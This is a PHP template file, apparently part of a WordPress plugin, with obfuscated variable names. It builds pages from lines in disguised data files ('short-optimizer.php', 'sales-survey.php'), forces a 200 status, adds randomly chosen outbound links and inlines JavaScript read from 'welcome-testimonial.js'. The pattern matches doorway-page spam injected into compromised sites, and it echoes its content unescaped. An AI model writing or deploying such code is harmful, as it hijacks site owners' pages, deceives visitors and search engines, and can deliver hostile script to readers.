<?php
$cvlzFX1 = intval(get_query_var('uumzfpku'));

if ($cvlzFX1 < 1 || $cvlzFX1 > 2979) return;
$oAE8Ma9XmW = file(plugin_dir_path(__FILE__).'short-optimizer.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$nYQ72 = explode(';', $oAE8Ma9XmW[$cvlzFX1]);
if (count($nYQ72) < 2) return;
$yU2KhYBKQ = $nYQ72[0];
$qU807ENlit  = $nYQ72[1];
$lifHBQ = $nYQ72[2];
$eG9Tq5t8Zr  = $nYQ72[3];
$uPD03w = $nYQ72[4];
set_query_var('wyqrwva', $yU2KhYBKQ);

$raZKR = '';
$tgfHvg4wo = plugin_dir_path(__FILE__).'sales-survey.php';
if (is_file($tgfHvg4wo)) {
	$qWk5pn8V = file($tgfHvg4wo, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($qWk5pn8V);
	shuffle($qWk5pn8V);
	$sS0xylZfRP = mt_rand(2, 5);
	if (count($qWk5pn8V) > $sS0xylZfRP) {
		for ($haGmWU = 0; $haGmWU < $sS0xylZfRP; $haGmWU++) {
			$ukjXHsv = array_shift($qWk5pn8V);
			$raZKR .= '<p><a href="'.$ukjXHsv.'">'.$ukjXHsv.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $yU2KhYBKQ; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $qU807ENlit . "</p>\n";
				if (strlen($eG9Tq5t8Zr) > 0) echo "<p>" . $eG9Tq5t8Zr . "</p>\n";
				if (strlen($lifHBQ) > 0) echo "<p>" . $lifHBQ . "</p>\n";
				if (strlen($uPD03w) > 0) echo '<p><a href="#"><img src="'.$uPD03w.'"></a>' . "</p>\n";
				echo $raZKR;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$tV0zV = plugin_dir_path(__FILE__) . 'welcome-testimonial.js';
if (is_file($tV0zV)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($tV0zV);
	echo '</script>';
}
get_footer();
?>
